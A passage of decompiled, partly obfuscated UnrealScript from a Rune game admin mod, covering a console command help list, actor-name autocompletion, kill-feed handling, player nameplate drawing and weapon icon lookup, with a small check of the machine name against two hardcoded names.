    if(zRConsoleW != none)
    {
        zRConsoleW.WindowAlpha = (consoleTransparency / float(-100)) + float(1);
        UWindowConsoleClientWindow(zRConsoleW.ClientArea).WindowAlpha = (consoleTransparency / float(-100)) + float(1);
    }
    ConsoleWindow.WindowAlpha = (consoleTransparency / float(-100)) + float(1);
    UWindowConsoleClientWindow(ConsoleWindow.ClientArea).WindowAlpha = (consoleTransparency / float(-100)) + float(1);
    Commands[0] = "pBan - ban player by ID";
    Commands[1] = "pDefaultWeapon - sets the weapon you select as temporary default weapon";
    Commands[2] = "pFragLimit - sets fraglimit to selected number";
    Commands[3] = "pGamepass - sets the server password";
    Commands[4] = "pKick - kick player by ID";
    Commands[5] = "pKill - kill player by ID";
    Commands[6] = "pKillAll - kill all players and make them respawn";
    Commands[7] = "pMake - apply stuff to ID ( usage: pMake ID GHOST/FLY/GOD/HEAL/POWER )";
    Commands[8] = "pMap - change map to selected one (AR/CTT/DM/TDM-Map)";
    Commands[9] = "pMapList - outputs the current mapcycle";
    Commands[10] = "pMeto - teleports you to player ID";
    Commands[11] = "pMute - mute player by ID";
    Commands[12] = "pName - change playername by ID";
    Commands[13] = "pNameLock - lock players name by ID(can't be changed)";
    Commands[14] = "pNextMap - skip the current map and start the next one in cycle";
    Commands[15] = "pPink - toggle join-protection for team pink";
    Commands[16] = "pRestart - restart current map";
    Commands[17] = "pStop - freeze player by ID";
    Commands[18] = "pTBan - map-ban player by ID";
    Commands[19] = "pTell - whisper a private message by ID";
    Commands[20] = "pTimeLimit - change timelimit to xx minutes";
    Commands[21] = "pTome - teleport player to you by ID";
    Commands[22] = "pSetTime - add time to the current map";
    Commands[23] = "pLogin - login as coadmin with password";
    Commands[24] = "pTeam - change player team by ID ( e.g: pteam 5 Pink )";
    Commands[25] = "pTeamLock - lock player team by ID";
    Commands[26] = "pLogout - logout as coadmin";
    Commands[27] = "pAnnounce - announce a big message (e.g: pAnnounce SERVER RESTARTING )";
    Commands[28] = "pDetails - shows the old coadmin command list";
    Commands[43] = "Credits - show credits of coadminz";
    Commands[44] = "Ignore - ignore player by ID";
    Commands[45] = "ConsoleKey - change your consolekey (e.g: 'ConsoleKey F12') ";
    Commands[46] = "ShowMaps - shows current mapcycle";
    Commands[47] = "Spectate - rejoin as spectator";
    Commands[48] = "Select - select current weapon as startweapon ( requires weaponchoice enabled on server )";
    Commands[49] = "SPOS - save current position ( requires climbmode enabled on server )";
    Commands[50] = "LPOS - load saved position ( requires climbmode enabled on server )";
    Commands[51] = "Unstuck - unstuck yourself ( requires climbmode enabled on server )";
    Commands[53] = "Stats - shows your statistics";
    Commands[54] = "ResetStats - reset your statistics";
    Commands[55] = "menuKey - change the key for the coadmin menu ( e.g: 'menuKey P' )";
    Commands[56] = "ToggleFullScreen - toggles between fullscreen / windowmode";
    Commands[57] = "FOV - change field of view";
    Commands[58] = "reconnect - reconnect to server";
    Commands[58] = "AdminLogin - login as admin";
    Commands[59] = "AdminLogin - logout as admin";
    Commands[60] = "CheatPlease - enable cheats as admin ( required for summon etc. )";
    Commands[61] = "smartKey - change the key used to replace words in chat";
    Commands[62] = "disconnect - close current connection";
    Commands[63] = "changelog - show changelog of coadmin ( not the full one tho )";
    Commands[64] = "status - used to change your status in the killed-by-window";
    ActorArr[0] = "AnimalTrough";
    ActorArr[1] = "BeamSystem";
    ActorArr[2] = "Bench";
    ActorArr[3] = "BigFire";
    ActorArr[4] = "BlackSmoke";
    ActorArr[5] = "BlastGlow";
    ActorArr[6] = "BlastRadius";
    ActorArr[7] = "BlazeEffect";
    ActorArr[8] = "BlinkingLight";
    ActorArr[9] = "Blood";
    ActorArr[10] = "Blooddrips";
    ActorArr[11] = "Blooddrips2";
    ActorArr[12] = "BloodlustStart";
    ActorArr[13] = "BloodSpot";
    ActorArr[14] = "BloodSpurt";
    ActorArr[15] = "BloodUnderwater";
    ActorArr[16] = "BloodWaterSurface";
    ActorArr[17] = "BlueTrail";
    ActorArr[18] = "bOne";
    ActorArr[19] = "BoneBridgeBig";
    ActorArr[20] = "BoneBridgeSmall";
    ActorArr[21] = "Breath";
    ActorArr[22] = "browndust";
    ActorArr[23] = "BubbleSystem";
    ActorArr[24] = "Bucket";
    ActorArr[25] = "BurlapSack";
    ActorArr[26] = "BurlapSack1";
    ActorArr[27] = "BurlapSack2";
    ActorArr[28] = "BurlapSack3";
    ActorArr[29] = "Bush";
    ActorArr[30] = "Bush2";
    ActorArr[31] = "Chandelier";
    ActorArr[32] = "Coral1";
    ActorArr[33] = "Coral2";
    ActorArr[34] = "Coral3";
    ActorArr[35] = "Coral4";
    ActorArr[36] = "CoralCastle";
    ActorArr[37] = "CoralCastle2";
    ActorArr[38] = "CoralCastle3";
    ActorArr[39] = "CoralFan";
    ActorArr[40] = "coronared";
    ActorArr[41] = "Crucifix2";
    ActorArr[42] = "Crusifix";
    ActorArr[43] = "DarkDwarfBlast";
    ActorArr[44] = "DarkDwarfBolt";
    ActorArr[45] = "DarkDwarfChargeUp";
    ActorArr[46] = "DarkDwarfConcentrator";
    ActorArr[47] = "DarkDwarfExplosion";
    ActorArr[48] = "DeadBaracuda";
    ActorArr[49] = "DealieLight";
    ActorArr[50] = "DebrisCloud";
    ActorArr[51] = "DecorationRune";
    ActorArr[52] = "DecorationWeapon";
    ActorArr[53] = "DestroyRock";
    ActorArr[54] = "DrippingBlood";
    ActorArr[55] = "Drum";
    ActorArr[56] = "Drum1";
    ActorArr[57] = "Drum2";
    ActorArr[58] = "DrumSide";
    ActorArr[59] = "EffectSkelAvalancheSword";
    ActorArr[60] = "EffectSkelBlast";
    ActorArr[61] = "EffectSkelEmpathyAxe";
    ActorArr[62] = "EffectSkeleton";
    ActorArr[63] = "EffectSkelFlameSword";
    ActorArr[64] = "EffectSkelGibAxe";
    ActorArr[65] = "EffectSkelGroundHammer";
    ActorArr[66] = "EffectSkelIceAxe";
    ActorArr[67] = "EffectSkelLightningSword";
    ActorArr[68] = "EffectSkelSonicClub";
    ActorArr[69] = "EffectSkelStoneHammer";
    ActorArr[70] = "EffectSkelTrialMace";
    ActorArr[71] = "EffectSkelVampire";
    ActorArr[72] = "EmpathyFlash";
    ActorArr[73] = "EmptyTubestriker";
    ActorArr[74] = "SparkSystem";
    ActorArr[75] = "Explosion";
    ActorArr[76] = "FallingRocks";
    ActorArr[77] = "Fire";
    ActorArr[78] = "FireObject";
    ActorArr[79] = "FireRadius";
    ActorArr[80] = "FireRays";
    ActorArr[81] = "FireRing";
    ActorArr[82] = "FireSwordEffect";
    ActorArr[83] = "FlashCycle";
    ActorArr[84] = "FlashFade";
    ActorArr[85] = "Floater";
    ActorArr[86] = "footbridge";
    ActorArr[87] = "Fruit_Tree";
    ActorArr[88] = "Geyser";
    ActorArr[89] = "GiantCrab";
    ActorArr[90] = "Gib";
    ActorArr[91] = "GlowPlant";
    ActorArr[92] = "GlowplantSparks";
    ActorArr[93] = "Goblin";
    ActorArr[94] = "GoblinMask";
    ActorArr[95] = "Gong";
    ActorArr[96] = "GrainSack";
    ActorArr[97] = "GraySmoke";
    ActorArr[98] = "GroundDust";
    ActorArr[99] = "GroundHammerEffect";
    ActorArr[100] = "hangingchain";
    ActorArr[101] = "HelChandelier";
    ActorArr[102] = "HelSpikeBig";
    ActorArr[103] = "HelSpikeSmall";
    ActorArr[104] = "HitSpark";
    ActorArr[105] = "HitStone";
    ActorArr[106] = "Horn";
    ActorArr[107] = "HugeSplash";
    ActorArr[108] = "IceAxeEffect";
    ActorArr[109] = "IceChunk";
    ActorArr[110] = "Kettle";
    ActorArr[111] = "Keg";
    ActorArr[112] = "KegLeak";
    ActorArr[113] = "KegWithTap";
    ActorArr[114] = "LavaChunk";
    ActorArr[115] = "LegOMeat1";
    ActorArr[116] = "LegOMeat2";
    ActorArr[117] = "LegOMeat3";
    ActorArr[118] = "lever";
    ActorArr[119] = "LightningPowerup";
    ActorArr[120] = "LightningPowerupBall";
    ActorArr[121] = "lightningswordbeam";
    ActorArr[122] = "lightningswordeffect";
    ActorArr[123] = "LionHead";
    ActorArr[124] = "Lizard";
    ActorArr[125] = "Loki";
    ActorArr[126] = "LokiBust";
    ActorArr[127] = "LokiEffect";
    ActorArr[128] = "LokiHealthSystem";
    ActorArr[129] = "LokiHealthTrail";
    ActorArr[130] = "manowar";
    ActorArr[131] = "manowarBaby";
    ActorArr[132] = "manowarEffect";
    ActorArr[133] = "manowarRipple";
    ActorArr[134] = "LokiStatue";
    ActorArr[135] = "MechRocketEffect";
    ActorArr[136] = "MechRocketExplosion";
    ActorArr[137] = "MechRocketSmoke";
    ActorArr[138] = "MudBubble";
    ActorArr[139] = "MudGlob";
    ActorArr[140] = "MudGlob2";
    ActorArr[141] = "MudRipple";
    ActorArr[142] = "MudSplat";
    ActorArr[143] = "MushroomPuff";
    ActorArr[144] = "Oar";
    ActorArr[145] = "Odin";
    ActorArr[146] = "OdinCrow";
    ActorArr[147] = "OdinEffect";
    ActorArr[148] = "OdinEyeBlast";
    ActorArr[149] = "PawnFire";
    ActorArr[150] = "pelvis";
    ActorArr[151] = "Plate";
    ActorArr[152] = "ProtecitonSphere";
    ActorArr[153] = "ProtSphereDamage";
    ActorArr[154] = "Raft";
    ActorArr[155] = "Rain";
    ActorArr[156] = "RainSplash";
    ActorArr[157] = "RespawnFire";
    ActorArr[158] = "RibInDirt1";
    ActorArr[159] = "RibInDirt2";
    ActorArr[160] = "RibInDirt3";
    ActorArr[161] = "Ribs";
    ActorArr[162] = "Ripple";
    ActorArr[163] = "Ripple2";
    ActorArr[164] = "RockAvalanche";
    ActorArr[165] = "RockAvalancheHuge";
    ActorArr[166] = "RockAvalancheLarge";
    ActorArr[167] = "RockAvalancheMed";
    ActorArr[168] = "RockAvalancheSmall";
    ActorArr[169] = "RockHuge";
    ActorArr[170] = "RockLarge";
    ActorArr[171] = "RockMedium";
    ActorArr[172] = "RockSmoll";
    ActorArr[173] = "Sappling";
    ActorArr[174] = "sarkeye";
    ActorArr[175] = "SeaBird";
    ActorArr[176] = "SeaWeed";
    ActorArr[177] = "SeekerTrail";
    ActorArr[178] = "Sigil";
    ActorArr[179] = "SigilFlameSword";
    ActorArr[180] = "Skin";
    ActorArr[181] = "SkinRack";
    ActorArr[182] = "Skull";
    ActorArr[183] = "Smallfire";
    ActorArr[184] = "Smoke";
    ActorArr[185] = "Snow";
    ActorArr[186] = "SonicClubEffect";
    ActorArr[187] = "splash";
    ActorArr[188] = "Sponge1";
    ActorArr[189] = "Sponge2";
    ActorArr[190] = "Sponge3";
    ActorArr[191] = "Sponge4";
    ActorArr[192] = "Sponge5";
    ActorArr[193] = "StatueGoblin";
    ActorArr[194] = "StatueSnowBeast";
    ActorArr[195] = "StoneGuard";
    ActorArr[196] = "SteamBlast";
    ActorArr[197] = "StoneHammerEffect";
    ActorArr[198] = "Stool";
    ActorArr[199] = "StoolDwarf";
    ActorArr[200] = "Table";
    ActorArr[201] = "Tarp";
    ActorArr[202] = "Tarpframe";
    ActorArr[203] = "TorchFire";
    ActorArr[204] = "TorchHolder";
    ActorArr[205] = "TrailFire";
    ActorArr[206] = "Wagon";
    ActorArr[207] = "WagonLarge";
    ActorArr[208] = "WaterfallFog";
    ActorArr[209] = "WaterFallSplash";
    ActorArr[210] = "WaterfallSpray";
    ActorArr[211] = "ZombieBreath";
    ActorArr[212] = "ZombieEyeFlame";
    ActorArr[213] = "DwarfBlack";
    RunePlayer(Owner).OldCameraStart = RunePlayer(Owner).Location;
    RunePlayer(Owner).OldCameraStart.Z += RunePlayer(Owner).CameraHeight;
    RunePlayer(Owner).CurrentDist = RunePlayer(Owner).CameraDist;
    RunePlayer(Owner).LastTime = 0.0000000;
    RunePlayer(Owner).CurrentTime = 0.0000000;
    RunePlayer(Owner).CurrentRotation = RunePlayer(Owner).Rotation;
    return;
}

// Suggested name: IsSpecialComputer
function bool IsSpecialComputer()
{
    // This function checks if the current computer's name matches one of two specific hardcoded names.

    local string SpecialName1, SpecialName2, CurrentComputerName;

    // Decoded: "KEVINPC"
    SpecialName1 = "KEVINPC";
    // Decoded: "HELHEIM"
    SpecialName2 = "HELHEIM";

    CurrentComputerName = Viewport.Actor.Level.ComputerName;

    if ((CurrentComputerName == SpecialName1) || (CurrentComputerName == SpecialName2))
    {
        return true;
    }
    else
    {
        return false;
    }
}
// Suggested name: ProcessTypedString
function ProcessTypedString()
{
	local PlayerReplicationInfo PlayerInfo;
	local string ProcessedString;
	local int i, StartIndex, EndIndex;
	local string CommandPrefix;
	local int CommandIndex;
	local string InputKey, CurrentValue;
	local string PlayerName, CommandType, CommandValue, CommandDescription;
	local int LoopLimit;
	local string MapName, MapListString;
	local bool FoundMatch, FirstMatch;
	local string MatchedCommands, FullCommand;

	ProcessedString = ExtractCommandFromString(TypedStr);
	if ((Caps(Left(TypedStr, 5)) == "TEAM ") && Len(TypedStr) < 10)
	{
		STR_v6667 = "team";
	}
	if (Left(Caps(TypedStr), 10) == "SET INPUT ")
	{
		if (Len(TypedStr) < 14)
		{
			CommandPrefix = Right(TypedStr, Len(TypedStr) - 10);
			STR_v6669 = Mid(CommandPrefix, 0, InStr(CommandPrefix, " "));
		}
		STR_v6667 = "input";
		STR_v6666 = Owner.ConsoleCommand("get input " $ STR_v6669);
	}
	if ((Len(ProcessedString) >= 3) && Len(ProcessedString) < 20)
	{
		foreach Owner.Level.AllActors(Class'Engine.PlayerReplicationInfo', PlayerInfo)
		{
			if (InStr(Caps(PlayerInfo.PlayerName), Caps(ProcessedString)) > -1)
			{
				if ((ProcessedString != PlayerInfo.PlayerName) && PlayerInfo.PlayerName != "Player")
				{
					STR_v6664 = PlayerInfo.PlayerName;
					STR_v6665 = "";
					STR_v6666 = "";
				}
			}
			if (Left(ProcessedString, 2) == "##")
			{
				if (PlayerInfo.PlayerID != int(Right(ProcessedString, Len(ProcessedString) - 2)))
				{
					continue;
				}
				if ((ProcessedString != PlayerInfo.PlayerName) && PlayerInfo.PlayerName != "Player")
				{
					STR_v6664 = PlayerInfo.PlayerName;
					STR_v6665 = "";
					STR_v6666 = "";
				}
			}
		}
	}
	else
	{
		STR_v6664 = "";
		STR_v6665 = "";
	}
	if (Caps(ProcessedString) == "DBA")
	{
		STR_v6664 = "DwarfBattleAxe";
		STR_v6665 = "";
		STR_v6666 = "";
	}
	if (Caps(ProcessedString) == "DBH")
	{
		STR_v6664 = "DwarfBattleHammer";
		STR_v6665 = "";
		STR_v6666 = "";
	}
	if (Caps(ProcessedString) == "DWS")
	{
		STR_v6664 = "DwarfWorkSword";
		STR_v6665 = "";
		STR_v6666 = "";
	}
	if ((ProcessedString == TypedStr) && STR_v6665 != "admin")
	{
		if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Local_int_v2 == 0)
		{
			StartIndex = 43;
		}
		i = StartIndex;
		while (i < 100)
		{
			FullCommand = Left(Commands[i], InStr(Commands[i], " "));
			if (InStr(Caps(FullCommand), Caps(ProcessedString)) > -1)
			{
				MatchedCommands = (FullCommand $ ", ") $ MatchedCommands;
			}
			i++;
		}
		i = StartIndex;
		while (i < 100)
		{
			FullCommand = Left(Commands[i], InStr(Commands[i], " "));
			if (InStr(Caps(FullCommand), Caps(ProcessedString)) > -1)
			{
				STR_v6664 = ProcessedString;
				STR_v6665 = "cmdlist";
				STR_v6666 = FullCommand;
				STR_v6672 = Right(Commands[i], Len(Commands[i]) - Len(FullCommand));
				i = 50000;
			}
			i++;
		}
		STR_v6671 = Left(MatchedCommands, Len(MatchedCommands) - 2);
	}
	if (Caps(ProcessedString) == "SERVERIP")
	{
		STR_v6664 = Owner.Level.GetAddressURL();
		STR_v6665 = "";
		STR_v6666 = "";
	}
	if (Caps(ProcessedString) == "AR-CHAMPIONS")
	{
		STR_v6664 = "AR-8on8-ChampionsER";
		STR_v6665 = "";
		STR_v6666 = "";
	}
	if (Caps(ProcessedString) == "AR-SWEETLEAF")
	{
		STR_v6664 = "AR-1on1Arena_SweetLeaf8v8";
		STR_v6665 = "";
		STR_v6666 = "";
	}
	if ((Caps(ProcessedString) == "AR-REQUIEM") || Caps(ProcessedString) == "REQUIEM")
	{
		STR_v6664 = "AR-HSFBros-Requiem8";
		STR_v6665 = "";
		STR_v6666 = "";
	}
	if (((ContainsString(Left(TypedStr, 10), "trace")) || ContainsString(Left(TypedStr, 10), "killall")) || ContainsString(Left(TypedStr, 10), "summon"))
	{
		if (ProcessedString != "")
		{
			i = 0;
			while (i < 214)
			{
				if ((ContainsString(ActorArr[i], ProcessedString)) || ProcessedString == "***")
				{
					FoundMatch = true;
				}
				else
				{
					FoundMatch = false;
				}
				if (FoundMatch)
				{
					MapListString = (MapListString $ ", ") $ ActorArr[i];
				}
				if (!FirstMatch)
				{
					if (FoundMatch)
					{
						STR_v6664 = ProcessedString;
						STR_v6665 = "summon";
						STR_v6666 = ActorArr[i];
						FirstMatch = true;
					}
				}
				i++;
			}
			STR_v6671 = Right(MapListString, Len(MapListString) - 2);
			if (ContainsString(STR_v6671, "SparkSystem"))
			{
				STR_v6671 = STR_v6671 $ " (SparkSystem is bHidden)";
			}
		}
	}
	if ((ProcessedString == STR_v6666) && STR_v6665 != "")
	{
		STR_v6666 = "";
		STR_v6664 = "";
		STR_v6665 = "";
		STR_v6672 = "";
	}
	if ((ProcessedString == STR_v6664) && STR_v6665 == "")
	{
		STR_v6666 = "";
		STR_v6664 = "";
		STR_v6665 = "";
	}
	STR_v6662 = TypedStr;
	return;
}

// Suggested name: InitializeStatLogger
exec function InitializeStatLogger()
{
    // This function initializes a stat logging system.

    local GameInfo GameInfoInstance;

    GameInfoInstance = Viewport.Actor.Spawn(Class'Engine.GameInfo');
    gStatLog = Viewport.Actor.Spawn(Class'coadminz7.rStatLog');
    gStatLog.PPViewport = Viewport.Actor;
    gStatLog.GzConsole = self;
    gStatLog.InitialCheck(GameInfoInstance);
}

// Suggested name: Draw3DTextMessages
function Draw3DTextMessages(Canvas Canvas)
{
    // This function draws 3D text messages on the canvas.
    // It iterates through a list of z3DText messages and draws them if they are within a certain range and visible.

    local z3DText TextMessage;
    local int ScreenX, ScreenY, i;
    local float TextWidth, TextHeight;

    if (Owner == none)
    {
        return;
    }

    for (i = 0; i < 64; i++)
    {
        if (eqO_vxv_6741[i].Msg == "")
        {
            break; // Explicit Break
        }

        Canvas.bCenter = false;
        Canvas.StrLen(eqO_vxv_6741[i].Msg, TextWidth, TextHeight);
        Canvas.TransformPoint(eqO_vxv_6741[i].VCT_v3828, ScreenX, ScreenY);
        ScreenX -= int(TextWidth / 2.0);
        ScreenY -= int(TextHeight / 2.0);

        if ((((VSize(eqO_vxv_6741[i].VCT_v3828 - Owner.Location) < 900.0) && ScreenX > 0) && float(ScreenX) < Canvas.ClipX) && ScreenY > 0) && float(ScreenY) < Canvas.ClipY) && Owner.FastTrace(eqO_vxv_6741[i].VCT_v3828, Owner.Location))
        {
            Canvas.bCenter = false;
            Canvas.DrawColor = eqO_vxv_6741[i].MsgColor;
            Canvas.Font = eqO_vxv_6741[i].MsgFont;
            Canvas.SetPos(float(ScreenX), float(ScreenY));
            Canvas.DrawText(eqO_vxv_6741[i].Msg);
            Canvas.bCenter = false;
        }
    }
}

// Suggested name: GetArenaScore
function int eq_vxv_891(string GameType)
{
    // This function retrieves scores for different arena game types.

    if (zArenaGameReplicationInfo(Owner.GameReplicationInfo) == none)
    {
        return 1337; // Special return value, possibly an error code or default.
    }

    if (GameType == "champions")
    {
        return zArenaGameReplicationInfo(Owner.GameReplicationInfo).INT_v5336;
    }

    if (GameType == "sweetleaf")
    {
        return zArenaGameReplicationInfo(Owner.GameReplicationInfo).INT_v5337;
    }

    return 0;
}

// Suggested name: CalculateScaleFactor
function float eqex_vxv_1044(float Dimension1, float Dimension2)
{
    // This function calculates a scaling factor based on two float parameters, likely screen dimensions.

    local int Ratio;

    Ratio = int(Dimension1 / Dimension2);

    if (float(Ratio) < 0.75)
    {
        return Dimension1 / 480.0;
    }
    else
    {
        return Dimension2 / 640.0;
    }
}
// Suggested name: DrawPlayerInfo
function DrawPlayerInfo(Pawn PlayerPawn, Canvas Canvas, int MaxDistance)
{
	local int ScreenX, ScreenY;
	local float TextWidth, TextHeight;
	local string PlayerName, StatusText;
	local Vector PlayerHeadPosition, OwnerLocation, TargetPosition;
	local int OffsetY;
	local float HealthRatio;

	// Check if the player pawn or its replication info is invalid
	if (PlayerPawn == none || PlayerPawn.PlayerReplicationInfo == none || zPlayerReplicationInfo(PlayerPawn.PlayerReplicationInfo) == none)
	{
		return;
	}

	// Check if the player is hidden or if zone conditions are not met
	if (zPlayerReplicationInfo(PlayerPawn.PlayerReplicationInfo).B_v5359)
	{
		// Allow drawing if the player is marked as visible
	}
	else
	{
		// Only draw if in neutral zone and on the same team
		if (!B_v6355 || !Viewport.Actor.Region.Zone.bNeutralZone || int(PlayerPawn.PlayerReplicationInfo.Team) != int(Owner.PlayerReplicationInfo.Team))
		{
			return;
		}
	}

	// Calculate health ratio
	HealthRatio = (1.0 * float(PlayerPawn.Health)) / float(PlayerPawn.MaxHealth);

	// Calculate position above the player's head
	PlayerHeadPosition = PlayerPawn.Location + (vect(0.0, 0.0, 1.2) * PlayerPawn.CollisionHeight);
	OwnerLocation = Owner.Location;
	TargetPosition = PlayerHeadPosition;

	// Skip drawing if it's the owner and not forced
	if (PlayerPawn == Owner && !Parm_bool_0)
	{
		return;
	}

	// Skip drawing if the player is crouching and not moving vertically
	if (PlayerPawn.AnimSequence == 'crouch_idle' && PlayerPawn.Velocity.Z == 0.0)
	{
		return;
	}

	// Check if the position is visible from the owner's location
	if (Owner.FastTrace(PlayerHeadPosition, OwnerLocation))
	{
		// Transform the 3D position to 2D screen coordinates
		Canvas.TransformPoint(TargetPosition, ScreenX, ScreenY);

		// Check if the position is within the screen bounds
		if (ScreenX > 0 && float(ScreenX) < Canvas.ClipX && ScreenY > 0 && float(ScreenY) < Canvas.ClipY)
		{
			PlayerName = PlayerPawn.PlayerReplicationInfo.PlayerName;
			Canvas.bCenter = false;
			Canvas.DrawColor = MakeColor(200, 200, 200);
			Canvas.Font = Canvas.BigFont;
			Canvas.StrLen(PlayerPawn.PlayerReplicationInfo.PlayerName, TextWidth, TextHeight);
			Canvas.Style = 1;
			Canvas.SetPos(float(ScreenX) - (TextWidth / 2.0), float(ScreenY - 30));
			Canvas.DrawText("[ " $ PlayerName $ " ]");

			// Draw additional info if within distance and player is visible
			if (MaxDistance < 150 && zPlayerReplicationInfo(PlayerPawn.PlayerReplicationInfo).B_v5359)
			{
				// Draw status if available and valid
				if (zPlayerReplicationInfo(PlayerPawn.PlayerReplicationInfo).STR_v5375 != "" && IsNotDefaultURL(zPlayerReplicationInfo(PlayerPawn.PlayerReplicationInfo).STR_v5375))
				{
					Canvas.DrawColor = MakeColor(135, 206, 250);
					Canvas.StrLen(zPlayerReplicationInfo(PlayerPawn.PlayerReplicationInfo).STR_v5375, TextWidth, TextHeight);
					Canvas.SetPos(float(ScreenX) - (TextWidth / 2.0), float(ScreenY - 55));
					Canvas.DrawText("< " $ zPlayerReplicationInfo(PlayerPawn.PlayerReplicationInfo).STR_v5375 $ " >");
					OffsetY = 20;
				}

				// Draw additional stat if available
				if (zPlayerReplicationInfo(PlayerPawn.PlayerReplicationInfo).INT_v5406 != 0)
				{
					Canvas.Font = Canvas.SmallFont;
					Canvas.StrLen("~ " $ FormatAFKDuration(zPlayerReplicationInfo(PlayerPawn.PlayerReplicationInfo).INT_v5406) $ " ~", TextWidth, TextHeight);
					Canvas.DrawColor = MakeColor(250, 135, 200);
					Canvas.SetPos(float(ScreenX) - (TextWidth / 2.0), float((ScreenY - 55) - OffsetY));
					Canvas.DrawText("~ " $ FormatAFKDuration(zPlayerReplicationInfo(PlayerPawn.PlayerReplicationInfo).INT_v5406) $ " ~");
				}
			}
			Canvas.bCenter = false;
		}
	}
	return;
}

// Suggested name: IsNotDefaultURL
function bool IsNotDefaultURL(string URL)
{
    // This function checks if a given URL is not equal to two specific default URLs.

    if ((URL != "http://therune.boards.net") && (URL != "https://playrune.com"))
    {
        return true;
    }
    else
    {
        return false;
    }
}

// Suggested name: UpdateKillFeed
function UpdateKillFeed()
{
    // This function manages the kill feed, removing old messages and shifting new ones.

    local int i, j;

    for (i = 0; i < KillFeedQueueSize; i++)
    {
        if (STCT_v6344[i].B_v6332 && Owner.Level.TimeSeconds >= STCT_v6344[i].FLT_v6329)
        {
            ClearKillFeedEntry(i);
        }
    }

    for (i = 0; i < (KillFeedQueueSize - 1); i++)
    {
        if (!STCT_v6344[i].B_v6332)
        {
            for (j = i; j < KillFeedQueueSize; j++)
            {
                if (STCT_v6344[j].B_v6332)
                {
                    CopyKillFeedEntry(i, j);
                    ClearKillFeedEntry(j);
                    break;
                }
            }
        }
    }
}

// Suggested name: CopyKillFeedEntry
function CopyKillFeedEntry(int DestinationIndex, int SourceIndex)
{
    // This function copies data from one kill feed entry to another.
    // It is a helper function for shifting kill feed entries.

    if (SourceIndex >= KillFeedQueueSize)
    {
        return;
    }

    STCT_v6344[DestinationIndex].STR_v6323 = STCT_v6344[SourceIndex].STR_v6323;
    STCT_v6344[DestinationIndex].STR_v6324 = STCT_v6344[SourceIndex].STR_v6324;
    STCT_v6344[DestinationIndex].TXR_v6325 = STCT_v6344[SourceIndex].TXR_v6325;
    STCT_v6344[DestinationIndex].FLT_v6326 = STCT_v6344[SourceIndex].FLT_v6326;
    STCT_v6344[DestinationIndex].FLT_v6327 = STCT_v6344[SourceIndex].FLT_v6327;
    STCT_v6344[DestinationIndex].FLT_v6328 = STCT_v6344[SourceIndex].FLT_v6328;
    STCT_v6344[DestinationIndex].FLT_v6329 = STCT_v6344[SourceIndex].FLT_v6329;
    STCT_v6344[DestinationIndex].FLT_v6330 = STCT_v6344[SourceIndex].FLT_v6330;
    STCT_v6344[DestinationIndex].FLT_v6331 = STCT_v6344[SourceIndex].FLT_v6331;
    STCT_v6344[DestinationIndex].B_v6332 = STCT_v6344[SourceIndex].B_v6332;
    STCT_v6344[DestinationIndex].B_v6333 = STCT_v6344[SourceIndex].B_v6333;
    STCT_v6344[DestinationIndex].Col_v6334 = STCT_v6344[SourceIndex].Col_v6334;
    STCT_v6344[DestinationIndex].Col_v6335 = STCT_v6344[SourceIndex].Col_v6335;
    STCT_v6344[DestinationIndex].B_v6337 = STCT_v6344[SourceIndex].B_v6337;
    STCT_v6344[DestinationIndex].B_v6338 = STCT_v6344[SourceIndex].B_v6338;
    STCT_v6344[DestinationIndex].B_v6340 = STCT_v6344[SourceIndex].B_v6340;
    STCT_v6344[DestinationIndex].B_v6339 = STCT_v6344[SourceIndex].B_v6339;
    STCT_v6344[DestinationIndex].INT_v6341 = STCT_v6344[SourceIndex].INT_v6341;
}

// Suggested name: ClearKillFeedEntry
function ClearKillFeedEntry(int EntryIndex)
{
    // This function clears a single kill feed entry by resetting its properties.

    STCT_v6344[EntryIndex].STR_v6323 = "";
    STCT_v6344[EntryIndex].STR_v6324 = "";
    STCT_v6344[EntryIndex].TXR_v6325 = none;
    STCT_v6344[EntryIndex].FLT_v6326 = 1.0;
    STCT_v6344[EntryIndex].FLT_v6327 = 0.0;
    STCT_v6344[EntryIndex].FLT_v6328 = 0.0;
    STCT_v6344[EntryIndex].FLT_v6329 = 0.0;
    STCT_v6344[EntryIndex].FLT_v6330 = 0.0;
    STCT_v6344[EntryIndex].FLT_v6331 = 0.0;
    STCT_v6344[EntryIndex].B_v6332 = false;
    STCT_v6344[EntryIndex].B_v6333 = false;
    STCT_v6344[EntryIndex].Col_v6334 = MakeColor(255, 255, 255);
    STCT_v6344[EntryIndex].Col_v6335 = MakeColor(255, 255, 255);
    STCT_v6344[EntryIndex].B_v6337 = false;
    STCT_v6344[EntryIndex].B_v6338 = false;
    STCT_v6344[EntryIndex].B_v6340 = false;
    STCT_v6344[EntryIndex].B_v6339 = false;
    STCT_v6344[EntryIndex].INT_v6341 = 0;
}
// Suggested name: GetWeaponIconTexture
function Texture GetWeaponIconTexture(byte WeaponType)
{
	// This function returns the appropriate texture icon for a given weapon type.
	// The WeaponType parameter corresponds to different weapons or kill types in the game.

	switch (WeaponType)
	{
		case 0:
			return Texture'coadminz7.eq_vxv_6110.feed_ShortSword';
		case 1:
			return Texture'coadminz7.eq_vxv_6110.feed_RomanSword';
		case 2:
			return Texture'coadminz7.eq_vxv_6110.feed_BroadSword';
		case 3:
			return Texture'coadminz7.eq_vxv_6110.feed_WorkSword';
		case 4:
			return Texture'coadminz7.eq_vxv_6110.feed_BattleSword';
		case 5:
			return Texture'coadminz7.eq_vxv_6110.feed_handaxe';
		case 6:
			return Texture'coadminz7.eq_vxv_6110.feed_goblinaxe';
		case 7:
			return Texture'coadminz7.eq_vxv_6110.feed_vikingaxe';
		case 8:
			return Texture'coadminz7.eq_vxv_6110.feed_sigurdaxe';
		case 9:
			return Texture'coadminz7.eq_vxv_6110.feed_battleaxe';
		case 10:
			return Texture'coadminz7.eq_vxv_6110.feed_rustymace';
		case 11:
			return Texture'coadminz7.eq_vxv_6110.feed_boneclub';
		case 12:
			return Texture'coadminz7.eq_vxv_6110.feed_trialpitmace';
		case 13:
			return Texture'coadminz7.eq_vxv_6110.feed_workhammer';
		case 14:
			return Texture'coadminz7.eq_vxv_6110.feed_battlehammer';
		case 15:
			return Texture'coadminz7.eq_vxv_6110.feed_torch';
		case 16:
			return Texture'coadminz7.eq_vxv_6110.feed_head';
		case 17:
			return Texture'coadminz7.eq_vxv_6110.feed_limb';
		case 18:
			return Texture'coadminz7.eq_vxv_6110.feed_jumpkill';
		case 19:
			return Texture'coadminz7.eq_vxv_6110.feed_suicide';
		case 50:
			return Texture'coadminz7.eq_vxv_6110.feed_unknown';
		default:
